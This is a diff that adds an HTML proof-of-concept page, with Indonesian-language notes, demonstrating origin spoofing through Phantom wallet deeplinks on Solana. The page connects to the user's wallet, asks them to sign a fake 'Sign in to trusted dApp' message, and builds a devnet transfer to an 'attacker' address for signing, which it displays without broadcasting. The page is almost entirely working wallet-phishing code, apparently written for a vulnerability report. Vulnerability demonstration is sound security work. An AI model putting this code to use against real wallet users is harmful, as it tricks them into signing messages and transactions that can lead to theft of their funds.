@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Phantom Deeplink Origin Spoofing – SOL PoC</title>
+  <style>
+    :root { --ok: #0f9d58; --warn:#e67700; --bad:#d93025; --muted:#6b7280; }
+    body { font-family: system-ui, -apple-system, Segoe UI, Inter, Roboto, Arial, sans-serif; margin: 22px; line-height: 1.45; }
+    .card { border: 1px solid #e5e7eb; border-radius: 14px; padding: 16px; margin: 12px 0; box-shadow: 0 1px 8px rgba(0,0,0,.04); }
+    .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    button { padding: 10px 14px; border-radius: 12px; border: 1px solid #e5e7eb; background: #f9fafb; cursor: pointer; }
+    button:disabled { opacity: .5; cursor: not-allowed; }
+    code, pre { background: #f3f4f6; border-radius: 8px; padding: 2px 6px; }
+    pre { padding: 12px; overflow: auto; }
+    .pill { display:inline-block; padding:4px 10px; border-radius: 999px; border:1px solid #e5e7eb; background:#fff; }
+    .ok { color: var(--ok); }
+    .warn { color: var(--warn); }
+    .bad { color: var(--bad); }
+    .muted { color: var(--muted); }
+    .banner { padding:12px 14px; border-radius:12px; background:#fff8e6; border:1px solid #ffe8b3; }
+  </style>
+  <!-- Web3.js (IIFE build exposes `solanaWeb3` global) -->
+  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+  <!-- bs58 for pretty-printing keys/signatures (optional) -->
+  <script src="https://unpkg.com/bs58@5.0.0/dist/bs58.min.js"></script>
+</head>
+<body>
+  <h1>Phantom Deeplink Origin Spoofing – <span class="pill">Solana PoC</span></h1>
+
+  <div class="card banner">
+    <strong>Tujuan demo:</strong> membuktikan bahwa halaman ini bisa dibuka di <em>in-app browser Phantom</em> via deeplink dan menampilkan UX yang seakan-akan “trusted”.
+    <div class="muted">Untuk pengujian etis saja. PoC ini <strong>tidak</strong> mengirim transaksi ke jaringan—hanya <em>signMessage</em> dan <em>signTransaction</em> lalu menampilkan hasilnya.</div>
+  </div>
+
+  <div class="card">
+    <h3>Environment</h3>
+    <pre id="env">Loading…</pre>
+  </div>
+
+  <div class="card">
+    <h3>Phantom Provider</h3>
+    <div class="row">
+      <span id="provStatus" class="pill muted">Detecting Phantom…</span>
+      <button id="btnConnect" disabled>Connect Phantom</button>
+      <span id="pubkey" class="muted">–</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Simulasi “Login” – <code>signMessage</code></h3>
+    <p class="muted">Pesan contoh ini sering dipakai buat “login” ke dApp. Jika user terkecoh oleh origin spoofing, mereka bisa menandatangani pesan ini tanpa sadar asal-usul situsnya.</p>
+    <div class="row">
+      <button id="btnSignMsg" disabled>Sign Message</button>
+      <span id="msgResult" class="muted">–</span>
+    </div>
+    <pre id="msgOut" style="display:none"></pre>
+  </div>
+
+  <div class="card">
+    <h3>Simulasi Transaksi – <code>signTransaction</code> (Devnet, <u>no broadcast</u>)</h3>
+    <p class="muted">Membuat transaksi dummy transfer <strong>1 lamport</strong> ke alamat devnet attacker (placeholder) hanya untuk ditandatangani—<strong>tidak</strong> dikirim.</p>
+    <div class="row">
+      <input id="toAddr" placeholder="Ganti dengan alamat devnet attacker (Base58)" style="flex:1 1 360px; padding:10px; border:1px solid #e5e7eb; border-radius:10px;" />
+      <button id="btnSignTx" disabled>Build + Sign Transaction</button>
+      <span id="txResult" class="muted">–</span>
+    </div>
+    <pre id="txOut" style="display:none"></pre>
+  </div>
+
+  <script>
+    const envEl = document.getElementById('env');
+    const provStatus = document.getElementById('provStatus');
+    const btnConnect = document.getElementById('btnConnect');
+    const pubkeyEl = document.getElementById('pubkey');
+    const btnSignMsg = document.getElementById('btnSignMsg');
+    const msgResult = document.getElementById('msgResult');
+    const msgOut = document.getElementById('msgOut');
+    const toAddr = document.getElementById('toAddr');
+    const btnSignTx = document.getElementById('btnSignTx');
+    const txResult = document.getElementById('txResult');
+    const txOut = document.getElementById('txOut');
+
+    const isPhantom = () => !!(window.solana && window.solana.isPhantom);
+
+    // Show basic environment info (for evidence)
+    const details = {
+      href: location.href,
+      origin: location.origin,
+      referrer: document.referrer || "(empty)",
+      userAgent: navigator.userAgent,
+      ts: new Date().toISOString()
+    };
+    envEl.textContent = JSON.stringify(details, null, 2);
+
+    // Provider detection
+    async function detectProvider(){
+      if (isPhantom()) {
+        provStatus.textContent = "Phantom detected";
+        provStatus.className = "pill ok";
+        btnConnect.disabled = false;
+      } else {
+        provStatus.textContent = "Phantom NOT detected";
+        provStatus.className = "pill bad";
+        btnConnect.disabled = true;
+      }
+    }
+
+    let walletPubkey = null;
+
+    btnConnect.addEventListener('click', async () => {
+      try {
+        const resp = await window.solana.connect({ onlyIfTrusted: false });
+        walletPubkey = resp.publicKey?.toString();
+        pubkeyEl.textContent = walletPubkey ? `Connected: ${walletPubkey}` : "Connected";
+        btnSignMsg.disabled = false;
+        btnSignTx.disabled = false;
+      } catch (e) {
+        pubkeyEl.textContent = `Connect cancelled/failed: ${e?.message || e}`;
+      }
+    });
+
+    // signMessage demo
+    btnSignMsg.addEventListener('click', async () => {
+      try {
+        if (!isPhantom()) throw new Error("Phantom provider not found");
+        const text = "Sign in to trusted dApp\nNonce=" + crypto.getRandomValues(new Uint32Array(1))[0];
+        const encodedMessage = new TextEncoder().encode(text);
+        const res = await window.solana.signMessage(encodedMessage, "utf8");
+        const sigB58 = window.bs58 ? bs58.encode(res.signature) : "(bs58 lib missing)";
+        msgResult.innerHTML = `<span class="ok">Signed</span>`;
+        msgOut.style.display = "block";
+        msgOut.textContent = JSON.stringify({
+          message: text,
+          publicKey: res.publicKey?.toString?.() || "(unknown)",
+          signature_b58: sigB58
+        }, null, 2);
+      } catch (e) {
+        msgResult.innerHTML = `<span class="bad">Failed</span>`;
+        msgOut.style.display = "block";
+        msgOut.textContent = String(e?.message || e);
+      }
+    });
+
+    // signTransaction demo (NO SEND)
+    btnSignTx.addEventListener('click', async () => {
+      try {
+        if (!isPhantom()) throw new Error("Phantom provider not found");
+        if (!walletPubkey) throw new Error("Connect wallet first");
+
+        const to = (toAddr.value || "").trim();
+        if (!to) throw new Error("Masukkan alamat tujuan devnet (Base58)");
+
+        // Build minimal transfer of 1 lamport on devnet
+        const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
+        const conn = new Connection("https://api.devnet.solana.com", "confirmed");
+        const feePayer = new PublicKey(walletPubkey);
+        const toPk = new PublicKey(to);
+
+        const { blockhash } = await conn.getLatestBlockhash("confirmed");
+        const tx = new Transaction({
+          recentBlockhash: blockhash,
+          feePayer
+        }).add(
+          SystemProgram.transfer({
+            fromPubkey: feePayer,
+            toPubkey: toPk,
+            lamports: 1 // 1 lamport only, and we won't send it
+          })
+        );
+
+        // Ask Phantom to sign (not send)
+        const signed = await window.solana.signTransaction(tx);
+
+        // Serialize for evidence
+        const raw = signed.serialize({ requireAllSignatures: false });
+        const b64 = btoa(String.fromCharCode(...raw));
+
+        txResult.innerHTML = `<span class="ok">Signed (not sent)</span>`;
+        txOut.style.display = "block";
+        txOut.textContent = JSON.stringify({
+          feePayer: feePayer.toBase58(),
+          to: toPk.toBase58(),
+          lamports: 1,
+          recentBlockhash: blockhash,
+          signed_tx_base64: b64.substring(0, 200) + "...(truncated)"
+        }, null, 2);
+      } catch (e) {
+        txResult.innerHTML = `<span class="bad">Failed</span>`;
+        txOut.style.display = "block";
+        txOut.textContent = String(e?.message || e);
+      }
+    });
+
+    detectProvider();
+  </script>
+</body>
+</html>
